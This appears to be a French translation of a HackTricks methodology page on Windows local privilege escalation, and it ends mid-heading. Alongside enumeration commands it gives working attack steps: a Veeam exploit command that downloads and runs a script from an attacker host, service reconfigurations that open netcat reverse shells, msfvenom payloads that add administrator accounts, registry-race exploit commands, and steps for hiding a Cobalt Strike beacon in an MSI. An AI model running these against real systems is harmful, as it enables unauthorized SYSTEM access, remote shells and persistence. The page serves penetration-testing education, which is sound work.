# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Meilleur outil pour rechercher des vecteurs de Windows local privilege escalation :** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Théorie initiale de Windows

### Access Tokens

**Si vous ne savez pas ce que sont les Windows Access Tokens, lisez la page suivante avant de continuer :**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Consultez la page suivante pour plus d'informations sur les ACLs - DACLs/SACLs/ACEs :**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Si vous ne savez pas ce que sont les integrity levels dans Windows, vous devriez lire la page suivante avant de continuer :**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Il existe différentes choses dans Windows qui pourraient **vous empêcher d'énumérer le système**, d'exécuter des exécutables ou même de **détecter vos activités**. Vous devriez **lire** la **page** suivante et **énumérer** tous ces **mécanismes** de **défense** avant de commencer l'énumération de l'élévation de privilèges :


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Les processus UIAccess lancés via `RAiLaunchAdminProcess` peuvent être abusés pour atteindre High IL sans invite lorsque les vérifications de chemin sécurisé d'AppInfo sont contournées. Consultez ici le workflow dédié de contournement UIAccess/Admin Protection :

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagation du registre d'accessibilité du Secure Desktop peut être abusée pour une écriture arbitraire dans le registre SYSTEM (RegPwn) :

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Vérifiez si la version de Windows a une vulnérabilité connue (vérifiez aussi les correctifs appliqués).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Ce [site](https://msrc.microsoft.com/update-guide/vulnerability) est pratique pour rechercher des informations détaillées sur les vulnérabilités de sécurité Microsoft. Cette base de données contient plus de 4 700 vulnérabilités de sécurité, montrant la **vaste surface d’attaque** qu’un environnement Windows présente.

**Sur le système**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas a watson intégré)_

**Localement avec les informations du système**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Dépôts Github d'exploits :**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Des identifiants/informations juicy sont-ils enregistrés dans les variables d’environnement ?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historique PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Fichiers PowerShell Transcript

Vous pouvez apprendre comment l’activer dans [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Journalisation des modules PowerShell

Les détails des exécutions du pipeline PowerShell sont enregistrés, notamment les commandes exécutées, les appels de commandes et des parties de scripts. Cependant, les détails complets de l’exécution et les résultats en sortie peuvent ne pas être capturés.

Pour l’activer, suivez les instructions de la section "Transcript files" de la documentation, en choisissant **"Module Logging"** au lieu de **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Pour voir les 15 derniers événements des logs PowerShell, vous pouvez exécuter :
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Un enregistrement complet de l’activité et du contenu intégral de l’exécution du script est capturé, garantissant que chaque bloc de code est documenté au fur et à mesure de son exécution. Ce processus préserve une piste d’audit complète de chaque activité, utile pour la forensics et l’analyse des comportements malveillants. En documentant toute l’activité au moment de l’exécution, il fournit des informations détaillées sur le processus.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Les événements de journalisation pour Script Block peuvent être trouvés dans Windows Event Viewer au chemin : **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Pour afficher les 20 derniers événements, vous pouvez utiliser :
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Paramètres Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Lecteurs
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Vous pouvez compromettre le système si les mises à jour ne sont pas demandées en utilisant http**S** mais http.

Vous commencez par vérifier si le réseau utilise une mise à jour WSUS non SSL en exécutant ce qui suit dans cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ou le suivant en PowerShell :
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Si vous obtenez une réponse comme l’une de celles-ci :
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Et si `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` est égal à `1`.

Alors, **c’est exploitable.** Si la dernière registry est égale à 0, alors l’entrée WSUS sera ignorée.

Afin d’exploiter ces vulnerabilities, vous pouvez utiliser des tools comme : [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Ce sont des scripts d’exploits MiTM weaponized pour injecter de fausses updates dans le trafic WSUS non-SSL.

Lisez la recherche ici :

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lire le rapport complet ici**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
En gros, c’est la flaw que ce bug exploite :

> Si nous avons le pouvoir de modifier notre proxy utilisateur local, et que Windows Updates utilise le proxy configuré dans les settings d’Internet Explorer, alors nous avons le pouvoir d’exécuter [PyWSUS](https://github.com/GoSecure/pywsus) localement pour intercepter notre propre trafic et exécuter du code en tant qu’utilisateur elevated sur notre asset.
>
> De plus, puisque le service WSUS utilise les settings du current user, il utilisera aussi son certificate store. Si nous générons un self-signed certificate pour le hostname WSUS et ajoutons ce certificate dans le certificate store du current user, nous pourrons intercepter à la fois le trafic WSUS HTTP et HTTPS. WSUS n’utilise aucun mécanisme de type HSTS pour implémenter une validation de type trust-on-first-use sur le certificate. Si le certificate présenté est trusted par l’utilisateur et possède le bon hostname, il sera accepté par le service.

Vous pouvez exploiter cette vulnerability en utilisant l’outil [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (une fois qu’il est liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents exposent une surface IPC localhost et un canal de mise à jour privilégié. Si l’enrollment peut être forcé vers un attacker server et que l’updater fait confiance à une rogue root CA ou à des weak signer checks, un local user peut livrer un MSI malveillant que le service SYSTEM installe. Voir une technique généralisée (basée sur la chaîne Netskope stAgentSvc – CVE-2025-0309) ici :


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` expose un service localhost sur **TCP/9401** qui traite des messages contrôlés par l’attaquant, permettant des commandes arbitraires en tant que **NT AUTHORITY\SYSTEM**.

- **Recon**: confirmez le listener et la version, par exemple `netstat -ano | findstr 9401` et `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: placez un PoC comme `VeeamHax.exe` avec les DLL Veeam requises dans le même répertoire, puis déclenchez un payload SYSTEM via le socket local :
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Le service exécute la commande en tant que SYSTEM.
## KrbRelayUp

Une vulnérabilité d'**élévation locale de privilèges** existe dans les environnements **domain** Windows dans certaines conditions. Ces conditions incluent des environnements où le **LDAP signing** n'est pas imposé, où les utilisateurs disposent de droits leur permettant de configurer le **Resource-Based Constrained Delegation (RBCD)**, ainsi que la possibilité pour les utilisateurs de créer des computers au sein du domain. Il est important de noter que ces **requirements** sont remplis avec les **default settings**.

Trouvez l'**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Pour plus d'informations sur le déroulement de l'attaque, consultez [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Si** ces 2 registers sont **enabled** (la valeur est **0x1**), alors les utilisateurs, quel que soit leur niveau de privilège, peuvent **install** (exécuter) des fichiers `*.msi` en tant que NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Charges utiles Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Si vous avez une session meterpreter, vous pouvez automatiser cette technique en utilisant le module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Utilisez la commande `Write-UserAddMSI` de power-up pour créer dans le répertoire courant un binaire MSI Windows afin d’escalader les privilèges. Ce script génère un installateur MSI précompilé qui invite à ajouter un utilisateur/groupe (vous aurez donc besoin d’un accès GIU) :
```
Write-UserAddMSI
```
Exécutez simplement le binaire créé pour élever les privilèges.

### MSI Wrapper

Lisez ce tutoriel pour apprendre à créer un MSI wrapper à l’aide de cet outil. Notez que vous pouvez encapsuler un fichier "**.bat**" si vous voulez **simplement** **exécuter** des **lignes de commande**

{{#ref}}
msi-wrapper.md
{{#endref}}

### Créer un MSI avec WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Créer un MSI avec Visual Studio

- **Générez** avec Cobalt Strike ou Metasploit un **nouveau Windows EXE TCP payload** dans `C:\privesc\beacon.exe`
- Ouvrez **Visual Studio**, sélectionnez **Create a new project** et tapez "installer" dans la zone de recherche. Sélectionnez le projet **Setup Wizard** et cliquez sur **Next**.
- Donnez au projet un nom, comme **AlwaysPrivesc**, utilisez **`C:\privesc`** pour l’emplacement, sélectionnez **place solution and project in the same directory**, puis cliquez sur **Create**.
- Continuez à cliquer sur **Next** jusqu’à l’étape 3 sur 4 (choose files to include). Cliquez sur **Add** et sélectionnez le Beacon payload que vous venez de générer. Puis cliquez sur **Finish**.
- Mettez en surbrillance le projet **AlwaysPrivesc** dans **Solution Explorer** et, dans **Properties**, changez **TargetPlatform** de **x86** à **x64**.
- Il existe d’autres propriétés que vous pouvez modifier, comme **Author** et **Manufacturer**, qui peuvent rendre l’application installée plus légitime.
- Faites un clic droit sur le projet et sélectionnez **View > Custom Actions**.
- Faites un clic droit sur **Install** et sélectionnez **Add Custom Action**.
- Double-cliquez sur **Application Folder**, sélectionnez votre fichier **beacon.exe** et cliquez sur **OK**. Cela garantira que le Beacon payload est exécuté dès que le programme d’installation est lancé.
- Dans **Custom Action Properties**, changez **Run64Bit** en **True**.
- Enfin, **build it**.
- Si l’avertissement `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` s’affiche, assurez-vous de définir la plateforme sur x64.

### Installation du MSI

Pour exécuter l’**installation** du fichier `.msi` malveillant en **arrière-plan** :
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Pour exploiter cette vulnérabilité, vous pouvez utiliser : _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Ces paramètres décident de ce qui est **logged**, donc vous devriez faire attention
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, il est intéressant de savoir où les logs sont envoyés
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** est conçu pour la **gestion des mots de passe de l’Administrateur local**, en garantissant que chaque mot de passe soit **unique, aléatoire et régulièrement mis à jour** sur les ordinateurs joints à un domaine. Ces mots de passe sont stockés de manière sécurisée dans Active Directory et ne peuvent être consultés que par les utilisateurs auxquels des permissions suffisantes ont été accordées via des ACL, leur permettant de voir les mots de passe de l’admin local s’ils sont autorisés.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Si actif, les **mots de passe en clair sont stockés dans LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protection LSA

À partir de **Windows 8.1**, Microsoft a introduit une protection renforcée pour le Local Security Authority (LSA) afin de **bloquer** les tentatives des processus non approuvés de **lire sa mémoire** ou d’injecter du code, renforçant ainsi la sécurité du système.\
[**Plus d'infos sur la protection LSA ici**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** a été introduit dans **Windows 10**. Son objectif est de protéger les identifiants stockés sur un appareil contre des menaces comme les attaques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Identifiants mis en cache

Les **identifiants de domaine** sont authentifiés par la **Local Security Authority** (LSA) et utilisés par les composants du système d'exploitation. Lorsqu'un login d'utilisateur est authentifié par un package de sécurité enregistré, des identifiants de domaine pour l'utilisateur sont généralement établis.\
[**Plus d'informations sur les Cached Credentials ici**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utilisateurs & Groupes

### Énumérer les utilisateurs & groupes

Vous devriez vérifier si l'un des groupes auxquels vous appartenez dispose d'autorisations intéressantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Groupes privilégiés

Si vous **appartenez à un groupe privilégié, vous pouvez peut-être élever vos privilèges**. Apprenez-en davantage sur les groupes privilégiés et sur la manière de les exploiter pour élever vos privilèges ici :


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulation de token

**Apprenez-en davantage** sur ce qu’est un **token** sur cette page : [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Consultez la page suivante pour **en savoir plus sur les tokens intéressants** et sur la manière de les exploiter :


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utilisateurs connectés / Sessions
```bash
qwinsta
klist sessions
```
### Dossiers personnels
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politique de mot de passe
```bash
net accounts
```
### Obtenir le contenu du presse-papiers
```bash
powershell -command "Get-Clipboard"
```
## Processus en cours

### Permissions des fichiers et dossiers

Tout d'abord, en listant les processus, **vérifiez s'il y a des mots de passe dans la ligne de commande du processus**.\
Vérifiez si vous pouvez **écraser un binaire en cours d'exécution** ou si vous avez des permissions d'écriture sur le dossier du binaire afin d'exploiter d'éventuelles attaques [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Toujours vérifier la présence possible de [**electron/cef/chromium debuggers** en cours d’exécution, vous pourriez l’abuser pour escalader les privilèges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Vérification des permissions des binaires des processus**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Vérification des permissions des dossiers des binaires des processus (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mining de mots de passe en mémoire

Vous pouvez créer un dump mémoire d'un processus en cours d'exécution à l'aide de **procdump** de Sysinternals. Des services comme FTP ont les **credentials en clair en mémoire**, essayez de dumper la mémoire et de lire les credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applications GUI non sécurisées

**Les applications s’exécutant en tant que SYSTEM peuvent permettre à un utilisateur de lancer un CMD, ou de parcourir des répertoires.**

Exemple : "Windows Help and Support" (Windows + F1), recherchez "command prompt", cliquez sur "Click to open Command Prompt"

## Services

Les Service Triggers permettent à Windows de démarrer un service lorsque certaines conditions se produisent (activité d’un named pipe/endpoint RPC, événements ETW, disponibilité IP, arrivée d’un périphérique, rafraîchissement GPO, etc.). Même sans droits SERVICE_START, vous pouvez souvent démarrer des services privilégiés en déclenchant leurs triggers. Voir les techniques d’énumération et d’activation ici :

-
{{#ref}}
service-triggers.md
{{#endref}}

Obtenir une liste des services :
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Autorisations

Vous pouvez utiliser **sc** pour obtenir des informations sur un service
```bash
sc qc <service_name>
```
Il est recommandé d'avoir le binaire **accesschk** de _Sysinternals_ pour vérifier le niveau de privilège requis pour chaque service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Il est recommandé de vérifier si "Authenticated Users" peuvent modifier un service quelconque :
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Vous pouvez télécharger accesschk.exe pour XP ici](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Activer le service

Si vous rencontrez cette erreur (par exemple avec SSDPSRV) :

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Vous pouvez l'activer en utilisant
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tenez compte que le service upnphost dépend de SSDPSRV pour fonctionner (pour XP SP1)**

**Une autre solution de contournement** à ce problème consiste à exécuter :
```
sc.exe config usosvc start= auto
```
### **Modifier le chemin du binaire du service**

Dans le scénario où le groupe "Authenticated users" possède **SERVICE_ALL_ACCESS** sur un service, il est possible de modifier l'exécutable binaire du service. Pour modifier et exécuter **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Redémarrer le service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Les privilèges peuvent être augmentés via diverses permissions :

- **SERVICE_CHANGE_CONFIG** : Permet la reconfiguration du binaire du service.
- **WRITE_DAC** : Autorise la reconfiguration des permissions, ce qui permet de modifier les configurations du service.
- **WRITE_OWNER** : Permet de prendre la propriété et de reconfigurer les permissions.
- **GENERIC_WRITE** : Hérite de la capacité à modifier les configurations du service.
- **GENERIC_ALL** : Hérite également de la capacité à modifier les configurations du service.

Pour la détection et l'exploitation de cette vulnérabilité, le _exploit/windows/local/service_permissions_ peut être utilisé.

### Services binaries weak permissions

**Vérifiez si vous pouvez modifier le binaire exécuté par un service** ou si vous avez des **permissions d'écriture sur le dossier** où le binaire est situé ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Vous pouvez obtenir chaque binaire exécuté par un service en utilisant **wmic** (pas dans system32) et vérifier vos permissions avec **icacls** :
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Vous pouvez aussi utiliser **sc** et **icacls** :
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Autorisations de modification du registre des services

Vous devriez vérifier si vous pouvez modifier un registre de service.\
Vous pouvez **vérifier** vos **autorisations** sur un **registre** de service en faisant :
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Il convient de vérifier si **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possèdent les permissions `FullControl`. Si c’est le cas, le binaire exécuté par le service peut être modifié.

Pour changer le Path du binaire exécuté :
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Certain Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` liste les fonctionnalités d’accessibilité installées.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stocke la configuration contrôlée par l’utilisateur.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` est créé pendant les transitions de logon/secure-desktop et est inscriptible par l’utilisateur.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Renseignez la valeur **HKCU ATConfig** que vous voulez faire écrire par SYSTEM.
2. Déclenchez la copie du secure-desktop (par ex. **LockWorkstation**), qui lance le flux du broker AT.
3. **Gagnez la race** en plaçant un **oplock** sur `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; lorsque l’oplock se déclenche, remplacez la clé **HKLM Session ATConfig** par un **registry link** vers une cible HKLM protégée.
4. SYSTEM écrit la valeur choisie par l’attaquant dans le chemin HKLM redirigé.

Une fois que vous avez une écriture arbitraire de valeur HKLM, pivotez vers LPE en écrasant des valeurs de configuration de service :

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Choisissez un service qu’un utilisateur normal peut démarrer (par ex. **`msiserver`**) et déclenchez-le après l’écriture. **Note :** l’implémentation publique de l’exploit **verrouille le workstation** dans le cadre de la race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Permissions AppendData/AddSubdirectory du registre des services

Si vous avez cette permission sur un registre, cela signifie que **vous pouvez créer des sous-registres à partir de celui-ci**. Dans le cas des services Windows, cela est **suffisant pour exécuter du code arbitraire :**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Si le chemin vers un exécutable n’est pas entre guillemets, Windows essaiera d’exécuter chaque fin de chemin avant un espace.

Par exemple, pour le chemin _C:\Program Files\Some Folder\Service.exe_, Windows essaiera d’exécuter :
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Lister tous les unquoted service paths, en excluant ceux appartenant aux services Windows intégrés:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Vous pouvez détecter et exploiter** cette vulnérabilité avec metasploit: `exploit/windows/local/trusted\_service\_path` Vous pouvez créer manuellement un binaire de service avec metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Actions de récupération

